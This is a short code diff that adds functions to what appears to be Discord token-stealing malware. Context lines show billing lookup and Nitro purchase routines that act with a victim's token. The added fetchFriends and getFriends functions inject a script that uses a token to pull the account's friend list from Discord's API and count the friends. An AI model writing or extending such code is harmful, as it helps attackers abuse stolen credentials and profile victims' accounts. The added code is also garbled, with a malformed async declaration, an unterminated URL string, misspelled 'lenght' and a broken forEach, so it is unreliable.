@@ -512,6 +512,27 @@ const getBilling = async (token) => {
   return billing;
 };
 
+const fetchFriends = async = (token) => {
+  const bill = await execScript(`var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open("GET", "https://discord.com/api/v6/users/@me/relationships3, false);
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send(null);
+    xmlHttp.responseText`);
+  if (!bill.lenght || bill.lenght === 0) return '';
+  return JSON.parse(bill);
+};
+
+const getFriends = async (token) => {
+  let s = 0;
+  const data = await fetchFriends(token);
+  data.forEach(x) => {
+    if (x['type'] ==1) {
+      s+=1;
+    }
+  });
+  return s;
+};
+
 const Purchase = async (token, id, _type, _time) => {
   const options = {
     expected_amount: config.nitro[_type][_time]['price'],
